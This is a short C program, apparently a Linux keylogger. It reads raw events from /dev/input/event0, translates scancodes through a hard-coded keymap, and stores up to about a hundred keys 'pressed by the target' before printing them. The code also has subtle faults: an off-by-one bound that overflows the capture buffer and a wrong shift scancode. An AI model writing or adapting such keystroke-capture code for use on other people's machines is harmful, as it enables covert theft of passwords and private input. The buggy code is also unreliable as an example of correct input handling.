#include <linux/input-event-codes.h>
#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>

/*Defines a struct type for keymapping the scancodes efficiently*/
typedef struct {
	int scancode;
	char ascii[10];
} KeyMapping;

#define MAX_KEYS 100
#define KEY_PRESS 1
#define KEY_RELEASE 0
#define KEYMAP_SIZE 54
#define SHIFT 127


int main(){
    /*Preset the scancode map to the keyboard layout for experimental uses*/
    KeyMapping keymap[KEYMAP_SIZE] = {
        {1, "[esc]"},
        {2, "1"},
        {3, "2"},
        {4, "3"},
        {5, "4"},
        {6, "5"},
        {7, "6"},
        {8, "7"},
        {9, "8"},
        {10, "9"},
        {11, "0"},
        {12, "-"},
        {13, "="},
	{14, "[backspc]"},
        {16, "q"},
        {17, "w"},
        {18, "e"},
        {19, "r"},
        {20, "t"},
        {21, "y"},
        {22, "u"},
        {23, "i"},
        {24, "o"},
        {25, "p"},
        {26, "´"},
        {27, "["},
        {28, "\n[enter]\n"},
	{29, "[ctrl]"},
        {30, "a"},
        {31, "s"},
        {32, "d"},
        {33, "f"},
        {34, "g"},
        {35, "h"},
        {36, "j"},
        {37, "k"},
        {38, "l"},
        {39, "ç"},
        {40, "~"},
        {43, "]"},
        {44, "z"},
        {45, "x"},
        {46, "c"},
        {47, "v"},
        {48, "b"},
        {49, "n"},
        {50, "m"},
        {51, ","},
        {52, "."},
        {53, ";"},
        {55, "."},
	{56, "[alt]"},
        {57, " "},
	{96, "\n[enter]\n"},
    };

    const char * keyboard = "/dev/input/event0";
    int rk = open(keyboard, O_RDONLY);
    if (rk == -1){
        printf("[-] An error ocurred when trying to read the keyboard.\n");
        return 1;
    }

    struct input_event event;
    int exit = 0;
    int key_counter = 0;
    int inUpperCase = 0;
    char typed[MAX_KEYS][10] = {};

    while (!exit && key_counter <= MAX_KEYS){
        read(rk, &event, sizeof(event));
        if (event.type == EV_KEY){
		/*Checks if shift was pressed or released*/
		if (event.code == SHIFT){
			inUpperCase = !inUpperCase;
		}
		/*Threatens key pressing values*/
		if (event.value == KEY_PRESS){
            		/*Checks if the pressed key is exit key (esc in this case)*/
            		if (event.code == 1){
                		exit = 1;
                		continue;
            		}
			int isCharacter, matchScancode;
			/*Stores the characters pressed by the target*/
			for (int i = 0; i < KEYMAP_SIZE; i++){
				isCharacter = keymap[i].ascii[1] == '\0';
				matchScancode = event.code == keymap[i].scancode;
				if (matchScancode){
					/*Puts characters in their upper version while shift is pressed*/
					if (inUpperCase && isCharacter){
						char upper_char[10] = { toupper(keymap[i].ascii[0]), '\0' };
						strcpy(typed[key_counter], upper_char);
					}else{
						strcpy(typed[key_counter], keymap[i].ascii);
					}
					key_counter++;
					i = KEYMAP_SIZE;
				}
			}
		}
    	}
    }

    printf("\n");
    close(rk);

    /*Print the characters typed directly in terminal for experimental reasons.*/
    for (int c = 0; c < key_counter; c++){
        printf("%s", typed[c]);
    }
    return 0;
}
